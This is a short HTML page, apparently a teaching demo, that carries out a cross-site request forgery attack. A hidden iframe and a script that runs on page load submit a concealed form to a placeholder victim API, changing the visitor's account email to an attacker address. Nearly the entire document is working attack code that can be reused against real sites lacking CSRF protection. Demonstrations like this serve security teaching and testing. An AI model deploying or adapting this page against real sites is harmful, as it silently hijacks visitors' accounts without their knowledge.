<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>CSRF Attack Simulation</title>
    <style>
        /* Hiding the iframe */
        iframe {
            display: none;
        }
    </style>
</head>
<body>

    <h1>Simulating a CSRF Attack</h1>
    <p>This page demonstrates a hidden CSRF attack using an iframe and an automatically submitting form.</p>

    <!-- Hidden iframe that will contain the form -->
    <iframe id="attackFrame" name="attackFrame"></iframe>

    <!-- Form designed to simulate a CSRF attack -->
    <form id="csrfForm" action="https://target-victim-site.com/api/change-data" method="POST" target="attackFrame">
        <!-- Form fields that would typically be part of a request -->
        <input type="hidden" name="user_id" value="12345">
        <input type="hidden" name="action" value="change-email">
        <input type="hidden" name="new_email" value="attacker@example.com">
    </form>

    <script>
        // Automatically submit the form when the page loads
        window.onload = function() {
            document.getElementById('csrfForm').submit();
        };
    </script>

</body>
</html>
